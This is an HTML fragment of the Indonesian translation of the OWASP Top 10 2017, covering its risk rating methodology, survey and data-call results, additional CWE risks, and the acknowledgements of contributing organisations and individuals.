+<p>Metodologi Penilaian Resiko OWASP mendefinisikan banyak faktor untuk membantu menghitung resiko kerentanan yang teridentifikasi. Namun, untuk Top 10 harus berbicara tentang generalitas, bukan kerentanan spesifik dalam aplikasi dan API nyata. Akibatnya, kita tidak akan pernah setepat pemilik aplikasi atau manajer saat menghitung resiko penerapannya. Anda paling siap untuk menilai pentingnya aplikasi dan data Anda, ancaman Anda, dan bagaimana sistem Anda telah dibangun dan dioperasikan.</p>
+<p>Metodologi kami mencakup tiga faktor kemungkinan untuk setiap kelemahan (prevalensi, kemampuan mendeteksi, dan kemudahan mengeksploitasi) dan saxtu faktor dampak (dampak teknis). Skala resiko untuk masing-masing faktor berkisar dari 1 terendah sampai 3 tertinggi dengan terminologi yang spesifik untuk setiap faktor. Prevalensi kelemahan adalah faktor yang biasanya tidak perlu anda hitung. Untuk data prevalensi, kami telah menyediakan statistik prevalensi dari sejumlah organisasi yang berbeda (seperti yang diacu dalam Ucapan Terimakasih di halaman 25), dan kami mengumpulkan data mereka bersama-sama untuk menghasilkan daftar kemungkinan Top 10 berdasarkan prevalensi. Data ini kemudian dikombinasikan dengan dua faktor kemungkinan lainnya (kemampuan mendeteksi, dan kemudahan mengeksploitasi) untuk menghitung tingkat kemungkinan untuk masing-masing kelemahan. Peringkat kemungkinan kemudian dikalikan dengan perkiraan rata-rata dampak teknis masing-masing item untuk menghasilkan peringkat resiko keseluruhan untuk setiap item di Top 10 (semakin tinggi hasilnya semakin tinggi resikonya). Deteksi, Kemudahan Eksploitasi, dan Dampak dihitung dari menganalisis CVE yang dilaporkan terkait dengan masing-masing kategori Top 10.</p>
+<p>Catatan: Pendekatan ini tidak memperhitungkan kemungkinan ancaman agen. Juga tidak memperhitungkan berbagai rincian teknis yang terkait dengan aplikasi khusus Anda. Salah satu faktor ini dapat secara signifikan mempengaruhi kemungkinan penyerang secara keseluruhan menemukan dan mengeksploitasi kerentanan tertentu. Peringkat ini tidak memperhitungkan dampak sebenarnya pada bisnis Anda. Organisasi Anda harus memutuskan seberapa besar resikonya keamanan dari aplikasi dan API yang bersedia diterima organisasi sesuai lingkungan budaya, industri, dan peraturan Anda. Tujuan dari OWASP Top 10 adalah tidak melakukan analisis resiko ini untuk Anda.</p>
+<p>Berikut ini menggambarkan perhitungan resiko A6: 2017-Security Misconfiguration</p>
+<p><img src="images/0xc0-risk-explanation.png" alt="Risk Calculation for A6:2017-Security Misconfiguration" /></p>
+<h1 id="rf-rincian-tentang-faktor-risiko">+RF Rincian Tentang Faktor Risiko</h1>
+<h2 id="ringkasan-faktor-risiko-top-10">Ringkasan Faktor Risiko Top 10</h2>
+<p>Tabel berikut menyajikan ringkasan Resiko Keamanan Aplikasi 10 Teratas 2017, dan faktor risiko yang telah kami berikan pada setiap risiko. Faktor-faktor ini ditentukan berdasarkan statistik yang ada dan pengalaman tim OWASP Top 10. Untuk memahami risiko ini untuk aplikasi atau organisasi tertentu, Anda harus mempertimbangkan suatu ancaman dan bisnis Anda sendiri. Bahkan kelemahan perangkat lunak yang cukup parah mungkin tidak menimbulkan risiko serius jika tidak ada suatu ancaman dalam posisi untuk tidak melakukan serangan yang diperlukan atau dampak bisnis menjadi pertimbangan agar dapat diabaikan untuk aset yang penting.</p>
+<p><img src="images/0xc1-risk-factor-table.png" alt="Risk Factor Table" /></p>
+<h2 id="risiko-tambahan-yang-harus-dipertimbangkan">Risiko Tambahan Yang Harus Dipertimbangkan</h2>
+<p>Top 10 mencakup banyak hal, namun ada banyak risiko lain yang harus Anda pertimbangkan dan evaluasi di organisasi Anda. Beberapa di antaranya telah muncul di versi 10 Teratas sebelumnya, dan yang lainnya tidak, termasuk teknik serangan baru yang diidentifikasi setiap saat. Risiko keamanan aplikasi penting lainnya (diurutkan dari CWE-ID) yang harus Anda pertimbangkan selain mencakup:</p>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion', 'AppDoS')</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/451.html">CWE-451: User Interface (UI) Misrepresentation of Critical Information (Clickjacking and others)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: Unvalidated Forward and Redirects</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/799.html">CWE-799: Improper Control of Interaction Frequency (Anti-Automation)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere (3rd Party Content)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li>
+</ul>
+<h1 id="dat-metodologi-dan-data">+Dat Metodologi dan Data</h1>
+<p>Di Konferensi Proyek OWASP, peserta aktif dan anggota komunitas memutuskan dalam konteks kerentanan, sampai dengan dua (2) kelas kerentanan ke depan, pengurutan didefinisikan sebagian oleh data kuantitatif, dan sebagian oleh survei kualitatif.</p>
+<h2 id="survei-peringkat-industri">Survei Peringkat Industri</h2>
+<p>Untuk survei, kami mengumpulkan kategori kerentanan yang telah diidentifikasi sebelumnya sebagai “titik puncak” atau disebutkan dalam tanggapan untuk 2017 RC1 pada Top 10 mailing list. Kami memasukkan mereka ke dalam survei peringkat dan meminta responden untuk memberikan peringkat kepada empat kerentanan teratas yang mereka rasakan harus disertakan dalam OWASP Top 10 - 2017. Survei dibuka dari 2 Agustus - 18 September 2017. 516 tanggapan dikumpulkan dan kerentanan-kerentanan tersebut telah diberikan peringkat.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Peringkat</th>
+<th>Kategori Survei Kerentanan</th>
+<th>Nilai</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>Pemaparan Informasi Pribadi ('Pelanggaran Privasi') [CWE-359]</td>
+<td>748</td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td>Kegagalan Kriptografi [CWE-310/311/312/326/327]</td>
+<td>584</td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td>Deserialisasi Data yang Tidak Terpercaya [CWE-502]</td>
+<td>514</td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td>Melewati Otorisasi Melalui Kunci yang Dikontrol Oleh Pengguna (IDOR &amp; Path Traversal) [CWE-639]</td>
+<td>493</td>
+</tr>
+<tr class="odd">
+<td>5</td>
+<td>Kurangnya Logging dan Pemantauan [CWE-223 / CWE-778]</td>
+<td>440</td>
+</tr>
+</tbody>
+</table>
+<p>Pemaparan Informasi Pribadi jelas merupakan kerentanan dengan peringkat tertinggi, namun sangat cocok digunakan sebagai penekanan tambahan pada <strong>A3:2017-Pengungkapan Data Sensitif</strong>. Kegagalan Kriptografi dapat dimasukan dalam Pengungkapan Data Sensitif. Deserialisasi yang tidak aman berada di peringkat tiga, jadi ditambahkan ke Top 10 sebagai <strong>A8:2017-Deserialization yang Tidak Aman</strong> setelah penilaian resiko. Kunci yang Dikontrol Oleh Pengguna yang berada di posisi keempat diikutkan dalam <strong>A5:2017-Akses Kontrol yang Rusak</strong>; Baik untuk melihatnya berperingkat tinggi dalam survei, karena tidak banyak data yang berkaitan dengan kerentanan otorisasi. Kategori peringkat nomor lima dalam survei ini adalah Kurangnya Logging dan Pemantauan, yang menurut kami sesuai untuk daftar Top 10, oleh karena itu, ini dijadikan <strong>A10:2017-Kurangnya Logging dan Pemantauan</strong>. Kami telah pindah ke titik di mana aplikasi harus dapat menentukan apa yang mungkin merupakan serangan dan menghasilkan pencatatan, peringatan, eskalasi, dan respons yang tepat. </p>
+<h2 id="panggilan-data-publik">Panggilan Data Publik</h2>
+<p>Secara tradisional, data yang dikumpulkan dan dianalisis lebih sesuai dengan data frekuensi: berapa banyak kerentanan yang ditemukan pada aplikasi yang diuji. Seperti diketahui, alat yang secara tradisional melaporkan semua kasus ditemukan adanya kerentanan dan manusia secara tradisional melaporkan satu temuan dengan sejumlah contoh. Hal ini membuat sangat sulit untuk menggabungkan dua gaya pelaporan dengan cara yang sebanding.</p>
+<p>Untuk tahun 2017, tingkat kejadian dihitung oleh berapa banyak aplikasi dalam kumpulan data tertentu yang memiliki satu atau lebih jenis kerentanan tertentu. Data dari banyak kontributor yang lebih besar diberikan dalam dua pandangan. Yang pertama adalah gaya frekuensi tradisional untuk menghitung setiap contoh yang menemukan kerentanan, sementara yang kedua adalah penghitungan aplikasi di mana setiap kerentanan ditemukan pada (satu atau beberapa kali). Meski tidak sempurna, ini cukup memungkinkan kita untuk membandingkan data dari Human Assisted Tools dan Tool Assisted Humans. Data mentah dan hasil analisisnya <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall">tersedia di GitHub</a>. Kami bermaksud untuk memperluas ini dengan struktur tambahan untuk versi Top 10 di masa depan.</p>
+<p>Kami menerima lebih dari 40 pengajuan dalam panggilan untuk data, dan karena banyak dari data asli yang difokuskan pada frekuensi, kami dapat menggunakan data dari 23 kontributor yang mencakup ~ 114.000 aplikasi. Kami menggunakan waktu satu tahun dimana memungkinkan dan diidentifikasi oleh kontributor. Mayoritas aplikasi itu unik, meski kami mengetahui kemungkinan beberapa pengulangan aplikasi antara data tahunan dari Veracode. 23 kumpulan data yang digunakan diidentifikasi sebagai alat bantu manusia untuk pengujian atau secara khusus memberikan tingkat kejadian dari alat bantu manusia. Anomali pada data terpilih kejadian 100% + disesuaikan sampai 100% maks. Untuk menghitung tingkat kejadian, kami menghitung persentase total aplikasi yang ditemukan mengandung masing-masing jenis kerentanan. Peringkat kejadian digunakan untuk perhitungan prevalensi dalam keseluruhan risiko untuk menentukan peringkat Top 10.</p>
+<h1 id="ucapan-terima-kasih">Ucapan Terima Kasih</h1>
+<h2 id="ucapan-terima-kasih-kepada-kontributor-data">Ucapan Terima Kasih kepada Kontributor Data</h2>
+<p>Kami ingin mengucapkan terima kasih kepada banyak organisasi yang menyumbangkan data kerentanan mereka untuk mendukung pembaruan 2017:</p>
+<ul>
+<li>ANCAP</li>
+<li>Aspect Security</li>
+<li>AsTech Consulting</li>
+<li>Atos</li>
+<li>Branding Brand</li>
+<li>Bugcrowd</li>
+<li>BUGemot</li>
+<li>CDAC</li>
+<li>Checkmarx</li>
+<li>Colegio LaSalle Monteria</li>
+<li>Company.com</li>
+<li>ContextIS</li>
+<li>Contrast Security</li>
+<li>DDoS.com</li>
+<li>Derek Weeks</li>
+<li>Easybss</li>
+<li>Edgescan</li>
+<li>EVRY</li>
+<li>EZI</li>
+<li>Hamed</li>
+<li>Hidden</li>
+<li>I4 Consulting</li>
+<li>iBLISS Seguran̤a &amp; Intelig̻encia</li>
+<li>ITsec Security Services bv</li>
+<li>Khallagh</li>
+<li>Linden Lab</li>
+<li>M. Limacher IT Dienstleistungen</li>
+<li>Micro Focus Fortify</li>
+<li>Minded Security</li>
+<li>National Center for Cyber Security Technology</li>
+<li>Network Test Labs Inc.</li>
+<li>Osampa</li>
+<li>Paladion Networks</li>
+<li>Purpletalk</li>
+<li>Secure Network</li>
+<li>Shape Security</li>
+<li>SHCP</li>
+<li>Softtek</li>
+<li>Synopsis</li>
+<li>TCS</li>
+<li>Vantage Point</li>
+<li>Veracode</li>
+<li>Web.com</li>
+</ul>
+<p>Untuk pertama kalinya, semua data berkontribusi pada rilis Top 10, dan daftar kontributor lengkap <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall/submissions">publicly available</a>.</p>
+<h2 id="ucapan-terima-kasih-kepada-kontributor-individu">Ucapan Terima Kasih kepada Kontributor Individu</h2>
+<p>Kami ingin mengucapkan terima kasih kepada kontributor individu yang menghabiskan banyak waktu untuk berkontribusi secara kolektif ke Top 10 di GitHub.</p>
+<ul>
+<li>ak47gen</li>
+<li>alonergan</li>
+<li>ameft</li>
+<li>anantshri</li>
+<li>bandrzej</li>
+<li>bchurchill</li>
+<li>binarious</li>
+<li>bkimminich</li>
+<li>Boberski</li>
+<li>borischen</li>
+<li>Calico90</li>
+<li>chrish</li>
+<li>clerkendweller</li>
+<li>D00gs</li>
+<li>davewichers</li>
+<li>drkknight</li>
+<li>drwetter</li>
+<li>dune73</li>
+<li>ecbftw</li>
+<li>einsweniger</li>
+<li>ekobrin</li>
+<li>eoftedal</li>
+<li>frohoff</li>
+<li>fzipi</li>
+<li>gebl</li>
+<li>Gilc83</li>
+<li>gilzow</li>
+<li>global4g</li>
+<li>grnd</li>
+<li>h3xstream</li>
+<li>hiralph</li>
+<li>HoLyVieR</li>
+<li>ilatypov</li>
+<li>irbishop</li>
+<li>itscooper</li>
+<li>ivanr</li>
+<li>jeremylong</li>
+<li>jhaddix</li>
+<li>jmanico</li>
+<li>joaomatosf</li>
+<li>jrmithdobbs</li>
+<li>jsteven</li>
+<li>jvehent</li>
+<li>katyanton</li>
+<li>kerberosmansour</li>
+<li>koto</li>
+<li>m8urnett</li>
+<li>mwcoates</li>
+<li>neo00</li>
+<li>nickthetait</li>
+<li>ninedter</li>
+<li>ossie-git</li>
+<li>PauloASilva</li>
+<li>PeterMosmans</li>
+<li>pontocom</li>
+<li>psiinon</li>
+<li>pwntester</li>
+<li>raesene</li>
+<li>riramar</li>
+<li>ruroot</li>
+<li>securestep9</li>
+<li>securitybits</li>
+<li>SPoint42</li>
+<li>sreenathsasikumar</li>
+<li>starbuck3000</li>
+<li>stefanb</li>
+<li>sumitagarwalusa</li>
+<li>taprootsec</li>
+<li>tghosth</li>
+<li>TheJambo</li>
+<li>thesp0nge</li>
+<li>toddgrotenhuis</li>
+<li>troymarshall</li>
+<li>tsohlacol</li>
+<li>vdbaan</li>
+<li>yohgaki</li>
+</ul>
+<p>Dan semua orang yang memberikan umpan balik via Twitter, email, dan cara lainnya.</p>
+<p>Kami akan lalai untuk tidak menyebutkan bahwa Dirk Wetter, Jim Manico, dan Osama Elnaggar telah memberikan bantuan ekstensif. Juga, Chris Frohoff dan Gabriel Lawrence memberikan dukungan yang tak ternilai dalam penulisan risiko Deserialization A8: 2017-Insecure yang baru.</p>
+</body>
+</html>
